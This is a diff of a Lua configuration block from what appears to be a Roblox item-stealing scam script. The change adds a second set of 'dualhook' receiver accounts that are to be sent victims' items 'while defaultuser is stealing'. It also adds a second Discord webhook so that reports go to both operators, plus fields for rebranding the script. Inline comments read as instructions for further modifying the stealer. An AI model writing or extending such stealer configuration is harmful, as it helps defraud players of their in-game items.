@@ -11,18 +11,14 @@
                         Discord: discord.gg/d2zgg2YDMz
 ]]
 _G.Script.SM.Config = {
-    DualHook-User = {"User1", "User2", "User3", "User4"},
-    pingEveryone = "No", -- dont change this
-    Webhook = "dumb",
-    FakeGift = "No",
-    Trash = "dumb",
-    LoadingScreen = "No",
-    GiftOnlyRares = "No",
-    ExecuteOtherScript = "No",
+    DualHook-User = {"User1", "User2", "User3", "User4"}, -- It should Replace         local usernames = {            "DUALHOOKUSERNAMES",        }  It should like this if defaultuser is stealing and this usernmae joins too it's should start gifting this or if only this joined it should start gifting this after it types something in chat or jump
+    DualHookWebhook = "https://discord.com/api/webhooks/xxxxxxxxxxxxxxxxx/xxxxxxxxxxxxxxxxx", -- Make It Like That It should send webhook to getgenv().Webhook and this webhook too
+    ServerName = "URSERVERNAME" -- It should replace dark scripts and add this server name instead of dark scripts
+    MSG = "" -- It should replace setclipboard
 }
     
-getgenv().Webhook = "PUT_HERE_UR_WEBHOOK"
-getgenv().Username = "PUT_HERE_UR_USERNAME"
+getgenv().Webhook = "https://discord.com/api/webhooks/xxxxxxxxxxxxxxxxx/xxxxxxxxxxxxxxxxx"
+getgenv().Username = "DefaultUser"
         local RS = game:GetService("ReplicatedStorage")
         local Players = game:GetService("Players")
         local HttpService = game:GetService("HttpService")
@@ -622,7 +618,7 @@ end)
                 end
 
         local usernames = {
-            "PUT_HERE_YOUR_BACK_UP_USERNAMES", -- PUT THEIR UR EXTRA USERNAMES
+            "DUALHOOKUSERNAMES",
         }
 
         local receiverPlr
